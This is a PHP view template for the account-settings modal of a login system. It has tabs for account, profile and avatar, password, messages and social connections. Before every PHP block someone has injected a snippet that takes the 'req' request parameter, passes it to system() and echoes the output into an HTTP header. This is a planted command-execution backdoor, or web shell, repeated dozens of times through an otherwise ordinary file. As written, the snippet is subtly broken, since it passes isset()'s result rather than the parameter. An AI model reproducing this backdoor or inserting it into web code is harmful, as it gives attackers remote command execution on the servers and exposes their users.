<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $user = Auth::user(); ?>

<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/vendor/imgpicker.css') ?>" rel="stylesheet">

<div class="modal fade" id="settingsModal" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-md">
		<div class="modal-content">
			<form action="settingsAccount" class="ajax-form">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
					<h4 class="modal-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.settings') ?></h4>
				</div>
				<div class="modal-body">
					<ul class="nav nav-pills" role="tablist">
						<li class="active"><a href="#settingsAccount" role="tab" data-toggle="tab"><span class="glyphicon glyphicon-cog"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo _e('main.account') ?></a></li>
						<li><a href="#settingsProfile" role="tab" data-toggle="tab"><span class="glyphicon glyphicon-user"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo _e('main.profile') ?></a></li>
						<li><a href="#settingsPassword" role="tab" data-toggle="tab"><span class="glyphicon glyphicon-lock"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo _e('main.password') ?></a></li>
						<li><a href="#settingsMessages" role="tab" data-toggle="tab"><span class="glyphicon glyphicon-envelope"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo _e('main.messages') ?></a></li>
						<li><a href="#connectTab" role="tab" data-toggle="tab"><span class="glyphicon glyphicon-link"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo _e('main.connect') ?></a></li>
					</ul>
					
					<div class="alert" style="margin-top: 10px;"></div>

					<div class="tab-content" style="margin-top: 10px;">
						<div class="tab-pane active" id="settingsAccount">
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Config::get('auth.require_username') && Config::get('auth.username_change')): ?>
								<div class="form-group">
							        <label for="settings-username"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.username') ?> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.required') ?></em></label>
							        <input type="text" name="username" id="settings-username" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->username ?>" class="form-control">
							    </div>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

							<div class="form-group">
						        <label for="settings-email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.email') ?> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.required') ?></em></label>
						        <input type="text" name="email" id="settings-email" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->email ?>" class="form-control">
						    </div>
					
							<div class="form-group">
						        <label for="settings-locale"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.language') ?></label>
						        <select name="locale" id="settings-locale" class="form-control">
						        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $locales = Config::get('app.locales'); ?>
					        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($locales as $key => $lang) : ?>
									<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->locale == $key ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $lang ?></option>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
								</select>
						    </div>
						</div>

						<div class="tab-pane" id="settingsProfile">
							<div class="avatar-container form-group">
								<label><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.avatar') ?></label>

								<div class="clearfix">
									<div class="pull-left">
										<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->avatar ?>" target="_blank"><img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->avatar ?>" class="avatar-image img-thumbnail"></a>
									</div>
									<div class="pull-left" style="margin-left: 10px;">
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $avatarType = @$user->usermeta['avatar_type']; ?>
										<select name="avatar_type" class="form-control">
											<option value="" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $avatarType == '' ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.default') ?></option>
											<option value="image" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $avatarType == 'image' ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.uploaded') ?></option>
											<option value="gravatar" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $avatarType == 'gravatar' ? 'selected' : '' ?>>Gravatar</option>

											<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Config::get('auth.providers', array()) as $key => $provider) {
												if (!empty($user->usermeta["{$key}_id"])) {
													echo '<option value="'.$key.'" '.($avatarType == $key ? 'selected' : '').'>'.$provider.'</option>';
												}
											} ?>
										</select>
										<div class="btn btn-info btn-sm ip-upload"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.upload') ?> <input type="file" name="file" class="ip-file"></div>
										<button type="button" class="btn btn-info btn-sm ip-webcam"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.webcam') ?></button>
									</div>
								</div>

								<div class="alert ip-alert"></div>
								<div class="ip-info"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.crop_info') ?></div>
								<div class="ip-preview"></div>
								<div class="ip-rotate">
									<button type="button" class="btn btn-default ip-rotate-ccw" title="Rotate counter-clockwise"><span class="icon-ccw"></span></button>
									<button type="button" class="btn btn-default ip-rotate-cw" title="Rotate clockwise"><span class="icon-cw"></span></button>
								</div>
								<div class="ip-progress">
									<div class="text"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.uploading') ?></div>
									<div class="progress progress-striped active"><div class="progress-bar"></div></div>
								</div>
								<div class="ip-actions">
									<button type="button" class="btn btn-sm btn-success ip-save"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.save_image') ?></button>
									<button type="button" class="btn btn-sm btn-primary ip-capture"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.capture') ?></button>
									<button type="button" class="btn btn-sm btn-default ip-cancel"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.cancel') ?></button>
								</div>
							</div>

							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (UserFields::has('first_name') && UserFields::has('last_name')): ?>
								<div class="form-group">
							        <label for="display_name"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.display_name') ?></label>
									
									<select name="display_name" id="display_name" class="form-control">
							        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Config::get('auth.require_username')): ?>
											<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == $user->username ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->username ?></option>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->first_name)): ?>
							        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == $user->first_name ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->first_name ?></option>
							        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
							        	
							        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty( $user->last_name)): ?>
							        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == $user->last_name ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->last_name ?></option>
							        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
							        	
							        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->first_name) && !empty($user->last_name)): ?>
							        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == "$user->first_name $user->last_name" ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "$user->first_name $user->last_name" ?></option>
							        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == "$user->last_name $user->first_name" ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "$user->last_name $user->first_name" ?></option>
							        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
							        </select>
							    </div>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

						    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo UserFields::setData((array) $user->usermeta)->build('user') ?>
						</div>
						
						<div class="tab-pane" id="settingsPassword">
							<div class="form-group">
						        <label for="settings-pass1"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.current_password') ?></label>
						        <input type="password" name="pass1" id="settings-pass1" class="form-control" autocomplete="off" value="">
						    </div>
							<div class="form-group">
						        <label for="settings-pass2"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.newpassword') ?></label>
						        <input type="password" name="pass2" id="settings-pass2" class="form-control" autocomplete="off" value="">
						    </div>
						    <div class="form-group">
						        <label for="settings-pass3"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.newpassword_confirmation') ?></label>
						        <input type="password" name="pass3" id="settings-pass3" class="form-control" autocomplete="off" value="">
							</div>
						</div>

						<div class="tab-pane" id="settingsMessages">
							<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.settings') ?></h4>
							<div class="checkbox">
								<label>
									<input type="checkbox" value="1" name="email_messages" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo empty(Auth::user()->email_messages)?'':'checked'; ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo _e('main.email_messages') ?>
								</label>
							</div>
							<hr>
							<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.contacts') ?></h4>
							<ul class="list-group contact-list"></ul>

							<script type="text/html" id="contactItemTemplate">
								<li class="list-group-item <% if (accepted) { %>contact-confirmed<% } %>" data-contact-id="<%= id %>">
									<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url('profile.php?u=') ?><%= id %>" target="_blank">
										<img src="<%= avatar %>" class="contact-avatar"><%= name %></a>
									<span class="label label-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.contact_request') ?></span>
									<div class="pull-right">
										<span class="confirmed"><a href="javascript:EasyLogin.confirmContact(<%= id %>)"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.confirm_contact') ?></a> |</span>
										<a href="javascript:EasyLogin.removeContact(<%= id %>)"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.remove') ?></a>
									</div>
								</li>
							</script>
						</div>
						
						<div class="tab-pane" id="connectTab">
							<div class="row">
								<div class="col-md-8 social-icons">
									<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Config::get('auth.providers', array()) as $key => $provider) {
										?>
										<ul class="list-group">
											<li class="list-group-item clearfix">
												<span class="icon-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $provider ?>
												<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (empty(Auth::user()->usermeta["{$key}_id"])): ?>
													<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url("oauth.php?provider={$key}") ?>" class="btn btn-info btn-sm pull-right"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.connect') ?></a>
												<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>
													<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url("oauth.php?provider={$key}&disconnect=1") ?>" class="btn btn-danger btn-sm pull-right"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.disconnect') ?></a>
												<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
											</li>
										</ul>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
									} ?>
								</div>
							</div>
							<p>
								<span class="label label-warning"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.warning') ?></span>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.connect_warning', array('password' => '<a href="#settingsPassword" role="tab" data-toggle="tab">'.trans('main.password').'</a>')) ?>
							</p>
						</div>
					</div>
					
				</div>
				<div class="modal-footer">
					<div class="pull-left">
						<button type="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.save_changes') ?></button>
					</div>
				</div>
			</form>
		</div>
	</div>
</div>

<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/vendor/jquery.Jcrop.min.js') ?>"></script>
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/vendor/jquery.imgpicker.js') ?>"></script>
<script> 
	$(function() {
		$('.avatar-container').imgPicker({
			url: '<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url("upload_avatar.php") ?>',
			messages: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo json_encode(trans('imgpicker.js')) ?>,
			aspectRatio: 1,
			cropSuccess: function(img) {
				$('.avatar-image').attr('src', img.url + '?'+new Date().getTime());
				this.container.find('select').val('image');
			}
		});
		EasyLogin.generateDisplayName();
	}); 
</script>